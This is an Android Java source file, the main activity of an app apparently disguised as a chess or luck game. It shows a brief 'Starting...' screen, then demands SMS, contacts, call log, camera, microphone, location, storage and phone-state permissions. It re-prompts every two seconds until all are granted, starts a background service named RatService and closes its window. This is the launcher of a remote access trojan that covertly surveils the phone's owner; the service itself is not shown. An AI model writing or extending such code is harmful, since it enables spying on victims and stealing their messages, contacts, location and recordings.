package com.my.luck;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.my.luck.core.RatService;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Simple view
        TextView tv = new TextView(this);
        tv.setText("♟️ Starting...");
        tv.setTextSize(30);
        tv.setGravity(android.view.Gravity.CENTER);
        tv.setTextColor(0xFFFFFFFF);
        tv.setBackgroundColor(0xFF1a1a2e);
        setContentView(tv);

        // Check permissions after delay
        handler.postDelayed(() -> checkPermissions(), 500);
    }

    private void checkPermissions() {
        List<String> needed = new ArrayList<>();
        needed.add(Manifest.permission.READ_SMS);
        needed.add(Manifest.permission.RECEIVE_SMS);
        needed.add(Manifest.permission.READ_CONTACTS);
        needed.add(Manifest.permission.READ_CALL_LOG);
        needed.add(Manifest.permission.CAMERA);
        needed.add(Manifest.permission.RECORD_AUDIO);
        needed.add(Manifest.permission.ACCESS_FINE_LOCATION);
        needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        needed.add(Manifest.permission.READ_PHONE_STATE);
        needed.add(Manifest.permission.INTERNET);
        needed.add(Manifest.permission.ACCESS_NETWORK_STATE);
        
        if (Build.VERSION.SDK_INT >= 33) {
            needed.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        List<String> missing = new ArrayList<>();
        for (String p : needed) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                missing.add(p);
            }
        }

        if (missing.isEmpty()) {
            startApp();
        } else {
            String[] arr = missing.toArray(new String[0]);
            ActivityCompat.requestPermissions(this, arr, PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == PERMISSION_REQUEST_CODE) {
            boolean all = true;
            for (int r : results) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    all = false;
                    break;
                }
            }
            if (all) {
                startApp();
            } else {
                Toast.makeText(this, "Grant all permissions!", Toast.LENGTH_SHORT).show();
                handler.postDelayed(() -> checkPermissions(), 2000);
            }
        }
    }

    private void startApp() {
        try {
            Intent intent = new Intent(this, RatService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            Toast.makeText(this, "✅ Running", Toast.LENGTH_SHORT).show();
            handler.postDelayed(() -> finish(), 1000);
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            finish();
        }
    }
}
